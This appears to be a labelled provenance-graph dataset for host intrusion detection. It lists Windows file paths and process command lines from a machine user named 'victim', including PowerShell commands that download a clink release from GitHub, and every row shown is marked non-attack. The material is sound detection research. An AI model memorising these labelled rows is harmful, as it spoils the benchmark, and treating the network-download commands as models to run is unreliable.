uuid,annotation,node_order,is_attack_node,in_degree_subgraph,out_degree_subgraph,total_degree_subgraph,in_degree_full,out_degree_full,total_degree_full
bd87a822-b961-4a2a-9d6e-a9bbfebfa4a9,{'file': 'C:\\Users\\victim\\Videos\\desktop.ini'},604,False,4,0,4,4,0,4
22eac536-0d8d-406e-a73b-1dbef8becabf,{'file': 'C:\\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\AutomaticDestinations\\f01b4d95cf55d32a.automaticDestinations-ms'},891,False,4,0,4,4,0,4
1f78507d-6bf9-45ce-8ee0-26deeb7f6418,{'file': 'C:\\Users\\victim\\Desktop\\cmder\\Cmder.exe'},925,False,1,0,1,4,0,4
f7ce6549-0332-4475-ae0d-592ab6abcbdd,{'file': 'e:Zone.Identifie'},929,False,2,0,2,4,0,4
475333e5-b54d-41bf-933f-1ca94d6291c3,{'subject': 'C:\\Windows\\system32\\cmd.exe /c where git.exe 2>nul'},1040,False,0,2,2,0,4,4
90290424-49a0-4afe-a87d-39c7818698fe,{'subject': 'where  git.exe '},1042,False,0,1,1,0,4,4
68de5744-916c-4b36-bdde-6fc604a5a1a9,"{'subject': 'C:\\Windows\\system32\\cmd.exe /c ""C:\\Users\\victim\\Desktop\\cmder\\vendor\\git-for-windows\\usr\\bin\\locale.exe"" -uU 2'}",1069,False,0,2,2,0,4,4
4bb1eee0-1f8d-4dbf-9ed2-1f5530ea7073,"{'subject': '""C:\\Users\\victim\\Desktop\\cmder\\vendor\\git-for-windows\\git-cmd.exe""  --no-needs-console --no-cd --command=post-install.bat'}",1104,False,0,1,1,0,4,4
10321061-6426-47f8-8879-05c41e4130d5,{'subject': 'C:\\Windows\\system32\\cmd.exe /c 2>nul git --no-optional-locks config --get-regexp alias'},1625,False,0,2,2,0,4,4
e5f9d5ed-78cc-455b-b6a1-38d5381b7d03,"{'subject': 'C:\\Windows\\system32\\cmd.exe /c 2>&1 ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"" -Command ""Get-Host'}",1644,False,0,4,4,0,4,4
83c5a030-6110-4273-918f-fd311d007d38,{'file': 'C:\\Windows\\Microsoft.Net\\assembly\\GAC_MSIL\\System.Management.Automation\\v4.0_3.0.0.0__31bf3856ad364e35\\System.Management.Automation.dll'},1658,False,4,0,4,4,0,4
48a32b70-9ad1-4c4d-a1be-781881de3f3a,{'file': 'C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\Microsoft.P521220ea#\\13ba5d4f4a12b25a15d07feb275cb6f0\\Microsoft.PowerShell.Commands.Utility.ni.dll.aux'},1698,False,4,0,4,4,0,4
a57cffd8-a26d-4c62-b6ea-de8b03cece14,{'file': 'C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\Modules\\Microsoft.PowerShell.Utility\\Microsoft.PowerShell.Utility.psm1'},1702,False,4,0,4,4,0,4
86d79af1-992f-45a4-a361-570d8c6a3687,"{'subject': 'C:\\Windows\\system32\\cmd.exe /c 2>&1 ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"" -Command ""$ProgressPreference=\'SilentlyContinue\' ; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 ; Invoke-WebRequest -Headers @{\\""cache-control\\""=\\""no-cache\\""} -UseBasicParsing https://api.github.com/repos/chrisant996/clink/releases/latest'}",1706,False,0,4,4,0,4,4
63940dfb-94db-43ff-8854-d1da1af83675,"{'subject': 'C:\\Windows\\system32\\cmd.exe /c 2>&1 ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"" -Command ""$ProgressPreference=\'SilentlyContinue\' ; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 ; Invoke-WebRequest \'https://github.com/chrisant996/clink/releases/download/v1.9.17/clink.1.9.17.36e2ca.zip\' -OutFile \'C:\\Users\\victim\\AppData\\Local\\Temp\\clink\\updater\\v1.9.17.zip\'""'}",1761,False,0,4,4,0,4,4
10361170-02cd-4bd6-a5d1-da394119e99c,{'file': 'C:\\Users\\victim\\AppData\\Local\\Packages\\Microsoft.Windows.Search_cw5n1h2txyewy\\LocalState\\ShellFeeds\\IDX_CONTENT_TASKBARHEADLINES.json'},1830,False,1,0,1,3,1,4
1b2e9ff2-99d6-4da9-a0be-5960f9c212b3,"{'subject': '""C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.26010.5-0\\MpCmdRun.exe"" SignaturesUpdateService -ScheduleJob -UnmanagedUpdate'}",2728,False,0,1,1,0,4,4
3fb35a1a-8e3d-4e87-941f-bc1571a8ad52,"{'subject': '""C:\\Windows\\System32\\ComputerDefaults.exe"" '}",8555,False,0,4,4,0,4,4
fac9a9e5-0661-4a19-95ff-95968d7fed4e,"{'subject': '""C:\\Windows\\system32\\dmclient.exe"" utcwnf'}",9961,False,0,1,1,0,4,4
0e56a93f-1429-49b0-8c35-9186bcac0353,{'subject': 'C:\\Windows\\system32\\msiexec.exe /V'},383,False,0,1,1,0,3,3
7d14e548-4efd-4bf6-84e7-cd3228eff8ef,{'file': 'C:\\Users\\victim\\OneDrive\\desktop.ini'},606,False,3,0,3,3,0,3
3c5ca7f2-f43f-4ea7-8739-03ea6daceaf1,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_671feb07fca38274_0_1'},701,False,2,0,2,3,0,3
41b36d15-db35-451f-8608-a1019047a097,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Network\\TransportSecurity'},771,False,2,1,3,2,1,3
b6c0f252-d669-4d44-971b-efcbace4fec9,{'file': 'identity_helper.exe'},840,False,1,0,1,3,0,3
6dd1c3f6-aaf1-4b78-a81b-b7db54da0cce,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Feature Engagement Tracker\\AvailabilityDB\\LOG.old'},849,False,2,1,3,2,1,3
1344710f-32ac-4b6d-8d61-a78c9bf0d519,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Feature Engagement Tracker\\EventDB\\LOG.old'},853,False,2,1,3,2,1,3
